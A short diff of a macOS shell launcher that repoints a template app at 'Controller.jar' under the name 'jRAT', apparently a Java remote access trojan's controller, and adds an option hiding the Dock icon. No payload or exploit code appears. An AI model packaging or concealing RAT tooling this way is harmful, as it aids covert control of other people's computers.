@@ -4,8 +4,8 @@
 # Constants
 JAVA_MAJOR=1
 JAVA_MINOR=7
-APP_JAR="sample.jar"
-APP_NAME="Sample Application"
+APP_JAR="Controller.jar"
+APP_NAME="jRAT"
 VM_ARGS=""
 
 # Set the working directory
@@ -44,4 +44,4 @@ if [[ "$_java" ]]; then
 fi
 
 # Run the application
-exec $_java $VM_ARGS -Dapple.laf.useScreenMenuBar=true -Dcom.apple.macos.use-file-dialog-packages=true -Xdock:name="$APP_NAME" -Xdock:icon="$DIR/../Resources/application.icns" -cp ".;$DIR;" -jar "$DIR/$APP_JAR"
+exec $_java $VM_ARGS -Dapple.laf.useScreenMenuBar=true -Duser.dir="$DIR" -Dcom.apple.macos.use-file-dialog-packages=true -Dapple.awt.UIElement=true -Xdock:name="$APP_NAME" -cp ".;$DIR;" -jar "$DIR/$APP_JAR"
